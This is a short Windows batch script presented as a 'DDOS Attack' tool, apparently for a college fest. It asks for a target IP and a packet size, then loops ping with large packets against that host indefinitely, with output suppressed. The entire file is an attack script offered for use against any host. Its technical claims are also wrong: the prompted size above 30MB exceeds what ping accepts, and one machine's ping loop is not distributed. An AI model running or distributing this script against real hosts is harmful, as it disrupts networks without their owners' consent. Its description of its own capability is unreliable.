@echo off
mode 67,16
title DDOS Attack
color A
cls
echo.
echo -----------------------------------------------------------------
echo DDOS Attack by Saif(KF ID:-KF08402)
echo -----------------------------------------------------------------
echo.
set /p x=Host name:
echo
echo -----------------------------------------------------------------
ping %x%
echo -----------------------------------------------------------------
@ping.exe 127.0.0.1 -n 5 -w 1000 > nul
goto Next
:Next
echo.
echo.
echo.
set /p m=Ip Host:
echo.
set /p n=size of packet greater than 30MB:

:DDOS
color 10
echo KIITFEST  %m%
ping %m% -l %n% -t >nul
goto DDOS